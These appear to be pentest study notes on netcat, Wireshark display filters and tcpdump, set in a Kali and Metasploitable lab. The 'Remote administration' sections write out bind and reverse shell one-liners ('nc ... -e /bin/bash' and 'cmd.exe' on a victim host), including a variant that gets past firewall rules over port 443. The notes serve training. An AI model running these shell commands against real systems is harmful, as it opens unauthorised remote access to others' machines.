# Essential tools

## Table of Contents
1. [Netcat](#netcat)
2. [Remote administration using netcat](#remote-administration-using-netcat)
3. [Remote administration using netcat Pt 02](#remote-administration-using-netcat-pt-02)
4. [Features of netcat](#features-of-netcat)
5. [Wireshark](#wireshark)

## Netcat

Netcat (often abbreviated to nc) is a computer networking utility for reading from and writing to network connections using TCP or UDP. Netcat is designed to be a dependable back-end that can be used directly or easily driven by other programs and scripts. At the same time, it is a feature-rich network debugging and investigation tool, since it can produce almost any kind of connection its user could need and has a number of built-in capabilities. [Wikipedia](https://en.wikipedia.org/wiki/Netcat)

### Netcat helper:
```
$ nc -h

OpenBSD netcat (Debian patchlevel 1.105-7ubuntu1)
This is nc from the netcat-openbsd package. An alternative nc is available
in the netcat-traditional package.
usage: nc [-46bCDdhjklnrStUuvZz] [-I length] [-i interval] [-O length]
	  [-P proxy_username] [-p source_port] [-q seconds] [-s source]
	  [-T toskeyword] [-V rtable] [-w timeout] [-X proxy_protocol]
	  [-x proxy_address[:port]] [destination] [port]
	Command Summary:
		-4		Use IPv4
		-6		Use IPv6
		-b		Allow broadcast
		-C		Send CRLF as line-ending
		-D		Enable the debug socket option
		-d		Detach from stdin
		-h		This help text
		-I length	TCP receive buffer length
		-i secs		Delay interval for lines sent, ports scanned
		-j		Use jumbo frame
		-k		Keep inbound sockets open for multiple connects
		-l		Listen mode, for inbound connects
		-n		Suppress name/port resolutions
		-O length	TCP send buffer length
		-P proxyuser	Username for proxy authentication
		-p port		Specify local port for remote connects
        	-q secs		quit after EOF on stdin and delay of secs
		-r		Randomize remote ports
		-S		Enable the TCP MD5 signature option
		-s addr		Local source address
		-T toskeyword	Set IP Type of Service
		-t		Answer TELNET negotiation
		-U		Use UNIX domain socket
		-u		UDP mode
		-V rtable	Specify alternate routing table
		-v		Verbose
		-w secs		Timeout for connects and final net reads
		-X proto	Proxy protocol: "4", "5" (SOCKS) or "connect"
		-x addr[:port]	Specify proxy address and port
		-Z		DCCP mode
		-z		Zero-I/O mode [used for scanning]
	Port numbers can be individual or ranges: lo-hi [inclusive]

```

### Create a connection:

```
$ nc [host] [port]
```

* TCP connection:
```
$ nc 192.168.0.100 110
$ nc www.example.com 21
```

* UDP connection:
```
$ nc -u 192.168.0.100 110
$ nc -u www.example.com 21
```

### -v: Verbose mode
```
$ nc -v [host] [port]
$ nc -v 192.168.0.100 110
$ nc -v www.example.com 21
```

### -n: Suppress name/port resolutions
```
$ nc -vn [host] [port]
$ nc -vn 192.168.0.100 110
$ nc -vn www.example.com 21
```

### Open port (TCP/UDP):

```
$ nc [command] [port]
```

* Commands:
	* -v: verbose
	* -l: Listen mode, for inbound connects
	* -p: Specify local port for remote connects
	* -u: UDP mode

* TCP port:

```
$ nc -vlp 5050
Listening on [0.0.0.0] (family 0, port 5050)
```

* UDP port:

```
$ nc -vlpu 9000
Listening on [0.0.0.0] (family 0, port 5050)
```

### Windows nc (in Kali Linux machine)

```
$ locate nc.exe
/usr/share/windows-binaries/nc.exe
```

### Get info from user browser
Open 8080 port, and send a link for user connect:

```
$ nc -vlp 8080
```

* User connect (output)
```
Connection from [127.0.0.1] port 8080 [tcp/http-alt] accepted (family 2, sport 58242)
GET / HTTP/1.1
Host: localhost:8080
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:58.0) Gecko/20100101 Firefox/58.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1
```

### Show a message from file

```
$ echo "Offline" >> srv
$ nc -vlp 8080 < srv
```

* User connect (output)
```
$ nc 127.0.01 8080
Offline
```

### Share files

* Host that will receive the file
```
$ nc [command] [port] > [path/to/file]
$ nc -lnvp 5050 > Desktop/file.ext
```

* Host that will send the file
```
$ nc [command] [host] [port] < [path/to/file]
$ nc -vn 192.168.0.100 5050 < Desktop/file.ext
```

## Remote administration using netcat

### -e: execute

```
$ nc [command] [port] -e [file-to-execute]
```

* Linux:
```
$ nc -vnlp 5050 -e /bin/bash
```

* Windows:
```
$ nc -vnlp 5000 -e cmd.exe
```

* Connect:
```
$ nc [command] [host] [port]
$ nc -vn 192.168.0.100 5050/5000
```

## Remote administration using netcat Pt 02

### Info

* File: firewall.zip
	* limpa_rules.sh
	* rules2.sh
	* rules3.sh
	* rules4.sh

* Virtual Machine: metasploitable

### Basic Sheel
* Open port connection (vict):
```
$ nc -vnlp 6000 -e /bin/bash
$ nc -vnlp 6000 -e cmd.exe
```

* Connect
```
$ nc -vn 192.168.0.100 6000
```

### rules2.sh

Basic firewall

* Open port connection (vict):
```
$ nc -vnlp 443 -e /bin/bash
$ nc -vnlp 443 -e cmd.exe
```

* Connect
```
$ nc -vn 192.168.0.100 443
```

### Reverse sheel

### rules3.sh

Blocks input, but allows output

* Open port connection
```
$ nc -vnlp 9050
```

* Connect (vict):
```
$ nc -vn 192.168.0.100 9050 -e /bin/bash
$ nc -vn 192.168.0.100 9050 -e cmd.exe
```

### rules4.sh

Blocks input and output (only allows output to 80,443)

* Open port connection
```
$ nc -vnlp 443
```

* Connect (vict):
```
$ nc -vn 192.168.0.100 443 -e /bin/bash
$ nc -vn 192.168.0.100 443 -e cmd.exe
```

## Features of netcat

### Execute scripts

* Files:
	* ping.sh

* Open port connect with (script machine)
```
$ nc -vnlp 9090 -e ping.sh
```

* Connect
```
$ nc -vn 192.168.0.100 9090
```

### Port scan

* -z: scan range of ports

```
$ nc [commands] [host] [port-range]
$ nc -vnz 192.168.0.100 1-65535
```

## Wireshark

### Filters
[Wireshark](https://wiki.wireshark.org/DisplayFilters) wiki filters.

* **Protocol**:
	* dns
	* http
	* tcp

* **ip.addr**: IP address
	* ip.addr == 192.168.0.100
	* ip.addr == 192.168.0.100 && * ip.addr == 192.168.0.101

* **ip.src**: IP Source
	* ip.src == [ip-addr]
	* ip.src == 192.168.0.100

* **ip.dst**: IP destination
	* ip.dst == [ip-addr]
	* ip.dst == 192.168.0.100

* **contains**
	* tcp/http contains [args]
	* tcp/http contains "senha"

* **http.request**: List all request
	* http.request

* **uri**: URI
	* http.request.uri contains [args]
	* http.request.uri contains password

## Tcpdump

- **-v**: verbose
- **-i**: interface
- **-w**: write scan in a file

```
root@kali:~# tcpdump -v -i eth0 -w scan.pcap
```

* **Protocol**:
```
root@kali:~# tcpdump -v -i eth0 icmp -w icmp.pcap
```

* **-r**: read file
```
root@kali:~# tcpdump -v -r icmp.pcap
```

* **-n**: Show ip address (no names)
```
root@kali:~# tcpdump -vnr icmp.pcap
```

* **Filters**:
	* Protocol:
		```
		root@kali:~# tcpdump -vnr scan.pcap icmp/tcp/udp
		```
	
	* host: filter by host IP
		```
		root@kali:~# tcpdump -vnr scan.pcap host 192.168.0.100
		root@kali:~# tcpdump -vnr scan.pcap host 192.168.0.100 and 192.168.0.1
		```

	* src: pack source

		```
		root@kali:~# tcpdump -vnr scan.pcap src host 192.168.0.100
		root@kali:~# tcpdump -vnr scan.pcap src host 192.168.0.100 and  dst host 192.168.0.1
		```

	* port: filter by port

		```
		root@kali:~# tcpdump -vnr scan.pcap port 21
		```
	
	* -A: see characters in ASCII

		```
		root@kali:~# tcpdump -vnAr scan.pcap
		```
	
	* -X: see characters in X

		```
		root@kali:~# tcpdump -vnXr scan.pcap
		```

	* grep: search for term

		```
		root@kali:~# tcpdump -vnXr scan.pcap | grep "[term]"
		```

### File

* portscanlog.pcap

```
root@kali:~# tcpdump -vnr portscanlog.pcap
root@kali:~# tcpdump -vnr portscanlog.pcap | head -n2
```

* Get ips:
```
root@kali:~# tcpdump -vnr portscanlog.pcap | cut -d " " -f5 | grep -v "ttl" | sort -u

192.168.0.104.44370
192.168.0.104.44420
192.168.0.104.44474
192.168.0.104.44475
192.168.0.104.44813
192.168.0.104.44856
192.168.0.104.44957
192.168.0.104.45352
192.168.0.104.45383
192.168.0.104.45662
192.168.0.104.46038
```

* Working:
	* Identification:
	Result: this is a port scan
		```
		root@kali:~# tcpdump -vnr portscanlog.pcap src host 192.168.0.104 | cut -d "," -f1 | grep -v "tos"
		```

	* Search ports:
		```
		root@kali:~# tcpdump -vnr portscanlog.pcap src host 192.168.0.104 | cut -d "," -f1 | grep -v "tos" | grep -v "[S]" | grep "F\."
		```